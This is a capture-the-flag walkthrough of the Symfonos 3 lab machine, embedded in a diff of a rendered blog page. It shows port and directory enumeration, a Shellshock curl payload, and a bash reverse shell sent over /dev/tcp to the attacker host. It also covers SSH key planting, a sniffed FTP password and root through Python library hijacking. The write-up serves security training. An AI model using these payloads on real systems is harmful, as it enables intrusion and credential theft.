@@ -1,0 +1,257 @@
+I"�R<p>This is an intermediate real life based machine created by <strong>zayotic</strong>, designed to test your skill at enumeration.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>We begin by discovering our target machine on the local network, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1/24
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-15 16:16 <span class="nt">-05</span>
+Nmap scan report <span class="k">for </span>192.168.179.137
+Host is up <span class="o">(</span>0.00072s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:0C:29:B7:54:77 <span class="o">(</span>VMware<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.254
+Host is up <span class="o">(</span>0.00074s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:50:56:FF:79:31 <span class="o">(</span>VMware<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.1
+Host is up.
+Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>6.75 seconds
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Ones our target has been located, it’s time to perform a TCP and UDP port scan, for this we use unicornscan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>us <span class="nt">-Iv</span> <span class="nt">-mT</span> <span class="nt">-p1-65535</span> 192.168.179.137 <span class="o">&amp;&amp;</span> us <span class="nt">-Iv</span> <span class="nt">-mU</span> <span class="nt">-p1-65535</span> 192.168.179.137
+...
+TCP open                     ftp[   21]         from 192.168.179.137  ttl 64
+TCP open                     ssh[   22]         from 192.168.179.137  ttl 64 
+TCP open                    http[   80]         from 192.168.179.137  ttl 64
+...
+</code></pre></div></div>
+<p>In the results we can see three open TCP ports, the scanned UDP ports were false positives, so I skipped them.</p>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>Then I start by enumerating the versions and services of the open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,22,80 <span class="nt">-Pn</span> 192.168.179.137 <span class="nt">-oN</span> nmap-service-enum.txt
+...
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5b
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 <span class="nb">cd</span>:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c <span class="o">(</span>RSA<span class="o">)</span>
+|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+MAC Address: 00:0C:29:B7:54:77 (VMware)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+...
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Since anonymous login is not enabled in the ftp service, I proceed to browse the web service on port 80.</p>
+
+<p><img src="/assets/images/symfonos3/screenshot-1.png" alt="" /></p>
+
+<p>But I don’t find anything interesting, so I run gobuster to find hidden directories and files.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.137 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> txt,sql,html,php
+...
+http://192.168.179.137/gate                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.137/gate/]
+http://192.168.179.137/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 280] 
+
+</code></pre></div></div>
+<p>The tool found the <strong>gate</strong> directory, so I try to access it with the browser.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.137/gate
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos3/screenshot-2.png" alt="" /></p>
+
+<p>In the same way I can’t find anything, so I try to enumerate the <strong>gate</strong> directory and locate the <strong>cerberus</strong> directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.137/gate/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> txt,sql,html,php
+...
+http://192.168.179.137/gate/cerberus             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 326] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.137/gate/cerberus/]
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.137/gate/cerberus/
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos3/screenshot-3.png" alt="" /></p>
+
+<p>After wasting time trying to list these directories and falling down a rabbit hole I decide to use the dirb wordlist.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.137 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt <span class="nt">-e</span> txt,sql,html,php
+...
+http://192.168.179.137/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 280]
+http://192.168.179.137/gate                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.137/gate/]
+http://192.168.179.137/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 241]                                   
+http://192.168.179.137/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 280] 
+...
+</code></pre></div></div>
+<p>I find a suspicious <strong>cgi-bin</strong>, I access it but nothing, the directory listing is not enabled.</p>
+
+<p><img src="/assets/images/symfonos3/screenshot-4.png" alt="" /></p>
+
+<p>I run gobuster to keep enumerating through the <strong>cgi-bin</strong> and finally I find the <strong>underworld</strong> resource, a potencial shellshock vulnerability.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.137/cgi-bin/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> txt,php
+...
+http://192.168.179.137/cgi-bin/underworld           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 62]
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.137/cgi-bin/underworld  
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos3/screenshot-5.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="shellshock">Shellshock</h3>
+
+<p>Shellshock is a vulnerability relies in the fact that BASH incorrectly executes trailing commands when it imports a function definition stored into an environment variable.</p>
+
+<p>Knowing what shellshock is, let’s proceed to exploit it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; /bin/bash -c 'id'"</span> http://192.168.179.137/cgi-bin/underworld
+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>,1003<span class="o">(</span>pcap<span class="o">)</span>
+</code></pre></div></div>
+
+<p>As we can see, it’s indeed vulnerable and we have been able to execute the <strong>id</strong> command.</p>
+
+<p><strong>Getting a reverse shell</strong></p>
+
+<p>I first set up a netcat listener on the attacking machine and then run the following curl instruction:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1'"</span> http://192.168.179.137/cgi-bin/underworld
+</code></pre></div></div>
+
+<p>As we can see, we have a limited shell of the target machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.137] 56878
+bash: no job control <span class="k">in </span>this shell
+cerberus@symfonos3:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">hostname</span><span class="p">;</span> <span class="nb">uname</span> <span class="nt">-a</span>
+symfonos3
+Linux symfonos3 4.9.0-9-amd64 <span class="c">#1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux</span>
+</code></pre></div></div>
+
+<p>One way to get a full shell is to write a public key to the cerberus home directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">grep </span>cerberus /etc/passwd
+cerberus:x:1001:1001:,,,:/home/cerberus:/bin/bash
+</code></pre></div></div>
+
+<p>We first generate a key pair with <strong>ssh-keygen</strong>, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s1">'s4rgaz&amp;'</span> <span class="nt">-f</span> id_rsa
+</code></pre></div></div>
+
+<p>Then we create the <strong>.ssh</strong> directory in his home, and redirect the public key to the <strong>authorized_keys</strong> file inside the <strong>.ssh</strong> directory.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">mkdir</span> /home/cerberus/.ssh
+cerberus@symfonos3:/usr/lib/cgi-bin<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnazZnt1nwwEQxd1JedANYuZWEiG4+ozHEwC1vpoaDokYbXUuICTFlKPVl6Z44vf6pcGiX8uRER3JADLhU4Oykijgm9filhWLWUX4m9f8oDFYG0WEA6qTjgkHSoty9ySyZ8byxvY9/CNJDl6spe/U1GiLkNmjRhalGxk2xaNvzu3d7UmGKoIPJPzvA3k3PDPQCYLvHIBllFUqFqz4o6S+to6R7CFE1jmPbyZNW5tX9ji5IDFc5Aa0N6ZjpIt+sh5F+EKdoydpHiwwKx3XSp4MdGKuDjTKdG07LeRX5MRLc2M6goPiQvpiVLPFUjmAb4K/vQ9y3VLSOiraE7hTW0Mf1gvNLhRru/wGnm/Sy8RExc1kmMYwPJQPo5PluplJMMaKp3AoEeanTKF6zyJKaiqakKUVfnj5eHQ2Xely+hKCLWp7Bbxmex6TXHb+jTgbuCJnA+L1Uj6ssM6md8uVJtz1He3G7ZGZDbDoAAeXON34t0x1bWCZgp/nw0bjS8Va7EWM='</span> <span class="o">&gt;</span> /home/cerberus/.ssh/authorized_keys
+</code></pre></div></div>
+
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<p>We access via ssh with the private key, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>ssh cerberus@192.168.179.137 <span class="nt">-i</span> id_rsa
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>:
+cerberus@symfonos3:~<span class="nv">$ </span><span class="nb">whoami
+</span>cerberus
+cerberus@symfonos3:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>cerberus<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>,1003<span class="o">(</span>pcap<span class="o">)</span>
+</code></pre></div></div>
+<p>After listing the system I realize that the cerberus user belongs to the group pcap, we can possibly use a sniffer and thus analyze the traffic, first start by listing the network interfaces.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:~<span class="nv">$ </span>ip addr
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 00:0c:29:b7:54:77 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.179.137/24 brd 192.168.179.255 scope global ens33
+       valid_lft forever preferred_lft forever
+    inet6 fe80::20c:29ff:feb7:5477/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div>
+
+<p>As we can see, there are only two network interfaces, so I try to sniff the loopback interface and write the packets to the pcap file, then I stop the capture and analyzing the packets, I found the hades user login credentials at FTP service.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:~<span class="nv">$ </span>tcpdump <span class="nt">-i</span> lo <span class="nt">-w</span> capture.pcap
+cerberus@symfonos3:~<span class="nv">$ </span>tcpdump <span class="nt">-r</span> capture.pcap | <span class="nb">grep</span> <span class="nt">-io</span> <span class="s1">'user.*\|pass.*'</span>
+reading from file capture.pcap, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
+USER hades
+Password required <span class="k">for </span>hades
+PASS PTpZTfU4vxgzvRBE
+User hades logged <span class="k">in</span>
+</code></pre></div></div>
+
+<p>Then I switch to the hades user with the credentials found, and I find the script that was authenticating to the FTP service, I dedicate that a cron job is executing the script every certain period of time.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cerberus@symfonos3:~<span class="nv">$ </span>su hades
+Password: 
+hades@symfonos3:/home/cerberus<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>hades<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>hades<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>hades<span class="o">)</span>,1002<span class="o">(</span>gods<span class="o">)</span>
+hades@symfonos3:/home/cerberus<span class="nv">$ </span><span class="nb">cd</span> /opt/ftpclient/
+hades@symfonos3:/opt/ftpclient<span class="nv">$ </span><span class="nb">ls
+</span>ftpclient.py  statuscheck.txt
+hades@symfonos3:/opt/ftpclient<span class="nv">$ </span><span class="nb">cat </span>ftpclient.py 
+import ftplib
+
+ftp <span class="o">=</span> ftplib.FTP<span class="o">(</span><span class="s1">'127.0.0.1'</span><span class="o">)</span>
+ftp.login<span class="o">(</span><span class="nv">user</span><span class="o">=</span><span class="s1">'hades'</span>, <span class="nv">passwd</span><span class="o">=</span><span class="s1">'PTpZTfU4vxgzvRBE'</span><span class="o">)</span>
+
+ftp.cwd<span class="o">(</span><span class="s1">'/srv/ftp/'</span><span class="o">)</span>
+
+def upload<span class="o">()</span>:
+    filename <span class="o">=</span> <span class="s1">'/opt/client/statuscheck.txt'</span>
+    ftp.storbinary<span class="o">(</span><span class="s1">'STOR '</span>+filename, open<span class="o">(</span>filename, <span class="s1">'rb'</span><span class="o">))</span>
+    ftp.quit<span class="o">()</span>
+
+upload<span class="o">()</span>
+</code></pre></div></div>
+
+<p>Listing writable directories, I find an interesting directory <strong>/usr/lib/python2.7</strong>, this is where the modules that import python scripts reside.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hades@symfonos3:/opt/ftpclient<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> d 2&gt;/dev/null
+/srv/ftp                                                         
+/usr/lib/python2.7                                           
+/dev/mqueue                                                    
+/dev/shm                                                      
+/var/lib/php/sessions                                    
+/var/tmp       
+...
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="python-library-hijacking">Python Library Hijacking</h3>
+<p>Since we have write permissions in this directory, we try to modify the <strong>ftplib.py</strong> module, first we create a copy of this module and then we write a reverse shell inside the ftplib.py file, which at the moment the script is executed will import our module with the reverse shell, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hades@symfonos3:/usr/lib/python2.7<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-1</span> | <span class="nb">grep</span> ^ft
+ftplib.py
+ftplib.pyc
+hades@symfonos3:/usr/lib/python2.7<span class="nv">$ </span><span class="nb">mv </span>ftplib.py ftplib.py.old
+hades@symfonos3:/usr/lib/python2.7<span class="nv">$ </span>nano ftplib.py 
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos3/screenshot-6.png" alt="" /></p>
+
+<p>After we set up a netcat listener and after a moment we have a reverse shell with root permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos3<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443 
+listening on <span class="o">[</span>any] 443 ... 
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.137] 45092
+bash: no job control <span class="k">in </span>this shell 
+root@symfonos3:~# <span class="nb">whoami  
+</span>root    
+root@symfonos3:~# <span class="nb">hostname 
+</span>symfonos3
+root@symfonos3:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+:ET
